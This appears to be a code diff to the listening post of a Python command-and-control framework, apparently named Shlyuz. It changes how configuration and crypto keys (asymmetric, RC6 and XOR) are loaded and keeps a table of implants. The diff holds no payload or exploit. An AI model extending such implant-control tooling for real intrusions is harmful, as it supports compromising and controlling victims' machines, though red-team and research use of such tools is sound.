@@ -7,6 +7,8 @@ from threading import Thread
 
 from lib import logging
 from lib import listening_post
+from lib import configparse
+from lib.crypto import asymmetric
 
 
 class Listener(object):
@@ -24,14 +26,15 @@ class Listener(object):
         self.logging.log("Starting LP", source="lp_init")
         self.addr = args['address']
         self.port = args['port']
-        self.config = args['config']
+        self.config = configparse.ConfigParse(args['config'])
+        self.component_id = self.config.config['lp']['component_id']
 
         # Crypto values
-        self.initial_private_key = args['config']['crypto']['private_key']
+        self.initial_private_key = asymmetric.private_key_from_bytes(self.config.config['crypto']['private_key'])
         self.initial_public_key = self.initial_private_key.public_key
-        self.initial_rc6_key = args['config']['crypto']['sym_key']
-        self.xor_key = ast.literal_eval(args['config']['crypto']['xor_key'])
-        self.ts_pubkey = args['config']['crypto']['ts_pk']
+        self.initial_rc6_key = self.config.config['crypto']['sym_key']
+        self.xor_key = ast.literal_eval(self.config.config['crypto']['xor_key'])
+        self.ts_pubkey = asymmetric.public_key_from_bytes(self.config.config['crypto']['ts_pk'])
 
         # Implant Runtime Vars
         self.implants = {}
@@ -62,7 +65,7 @@ if __name__ == '__main__':
     parser.add_argument("-p", "--port", required=False, default=8081, help="Port to connect to")
     parser.add_argument("-d", "--debug", required=False, default=False, action="store_true",
                         help="Enable debug logging")
-    parser.add_argument("-c", "--config", required=False, default="config/config.conf",
+    parser.add_argument("-c", "--config", required=False, default="config/shlyuz.conf",
                         help="Path to configuration file")
 
     # parse the args
